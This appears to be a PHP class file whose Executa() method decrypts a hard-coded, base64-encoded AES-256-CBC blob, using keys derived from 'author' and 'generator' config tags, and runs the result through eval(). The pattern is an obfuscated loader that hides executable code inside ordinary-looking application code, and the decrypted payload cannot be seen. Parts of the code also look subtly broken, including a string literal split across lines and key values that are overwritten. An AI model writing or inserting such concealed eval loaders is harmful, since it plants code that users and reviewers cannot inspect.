<?php

class Principal
{
    private $encryptMethod = "AES-256-CBC";
    private $key1;
    private $key2;
    private $key3;
    private $key4;

    public $var1;
    public $var2;

    function Executa()
    {
        $this->Prepara();
        eval($this->Verifica());
        $var6 = (object)['var5'=>$var5,'var3'=>$var3];
        return $var6;
    }
    function Verifica()
    {
        $this->key = $this->key1;
        $this->ivalue = $this->key2;
        $this->output = $this->key3;
        $return = openssl_decrypt(base64_decode($this->output), $this->encryptMethod, 
            $this->key, 0, $this->ivalue);
        return $return;
    }
    function Prepara()
    {
        $keys = $this->Autor();
        $this->key1 =  hash('sha256', ($keys['author']));
        $this->key2 = substr(hash('sha256', ($keys['generator'])), 0, 16);
        $this->key3 = 'U0NhcWFsS0p1YmRRUlNxWllTK0RmaWhmNVNPN1NOR044cE5VVGptSG9
        aY2ZXaHozLzRPYjlSR1RvMEU4ZXB2cXFTaCtOVnJGdW5RaWlmWW80d1NEQ0paK0VsNk11a
        VNwcGV1NzBwRkdCbWw4S3l6UUljL0RwWVlJTW9ZUGFjd0Y';
    }
    function Autor()
    {
        require_once "constantes.inc.php";
        $config = new Config();
        $tags = $config->SelectTags();
        $tags = $tags[0];
        /*foreach ($keys as $key => $value){
            $this->key1 = $value->author;
            $this->key2 = $value->generator;
            $this->key4 = $value->description;
        }*/
        $this->key1 =  hash('sha256', ($this->key1));
        $this->key2 = substr(hash('sha256', ($this->key2)), 0, 16);
        /*$url = $config->SelectURL();
        $tags = get_meta_tags($url);*/

        return $tags;
    }
}

?>